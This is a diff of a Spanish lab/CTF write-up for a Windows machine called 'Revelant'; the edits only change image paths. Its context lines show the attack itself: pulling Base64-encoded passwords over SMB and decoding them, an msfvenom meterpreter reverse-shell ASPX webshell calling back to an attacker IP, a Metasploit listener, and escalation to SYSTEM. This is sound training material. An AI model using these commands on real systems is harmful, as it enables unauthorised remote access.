@@ -92,7 +92,7 @@ get passwords.txt
 ```
 luego de hacer eso hacemos exit.
 
-![get](./imagenes/smb2.png)
+![get](Maquinas_de_Windows/Revelant/imagenes/smb2.png)
 
 Después de salirnos miramos el archivo, por eso es importante hacer el get.
 
@@ -108,7 +108,7 @@ Qm9iIC0gIVBAJCRXMHJEITEyMw==
 QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
 ```
 
-![cat](./imagenes/cat.png)
+![cat](Maquinas_de_Windows/Revelant/imagenes/cat.png)
 
 Se observa que las credenciales están codificadas en Base64, por lo que se procede a decodificarlas:
 
@@ -123,7 +123,7 @@ Resultado:
 Bob - !P@$$W0rD!123
 Bill - Juw4nnaM4n4206969!$$$
 ```
-![echo](./imagenes/echo.png)
+![echo](Maquinas_de_Windows/Revelant/imagenes/echo.png)
 
 Esto revela dos posibles usuarios del sistema junto con sus contraseñas.
 
@@ -138,7 +138,7 @@ Se genera una webshell en formato ASPX compatible con servidores IIS:
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.142.53 LPORT=8910 -f aspx -o shell.aspx
 ```
 
-![venom](./imagenes/msfvenom.png)
+![venom](Maquinas_de_Windows/Revelant/imagenes/msfvenom.png)
 
 Explicación:
 
@@ -174,7 +174,7 @@ Se verifica que el archivo se ha subido correctamente:
 ```bash
 ls
 ```
-![cliente](./imagenes/smbcliente.png)
+![cliente](Maquinas_de_Windows/Revelant/imagenes/smbcliente.png)
 
 ### 4.3 Configuración del listener en Metasploit
 
@@ -189,7 +189,7 @@ set LPORT 8910
 run
 ```
 
-![msfconsole](./imagenes/msfconsole.png)
+![msfconsole](Maquinas_de_Windows/Revelant/imagenes/msfconsole.png)
 
 ## 4.4 Ejecución de la webshell
 
@@ -241,7 +241,7 @@ Ahora volvemos hacer el comando para ver si somos system.
 getuid
 ```
 
-![getuid](./imagenes/system.png)
+![getuid](Maquinas_de_Windows/Revelant/imagenes/system.png)
 
 Resultado esperado:
 
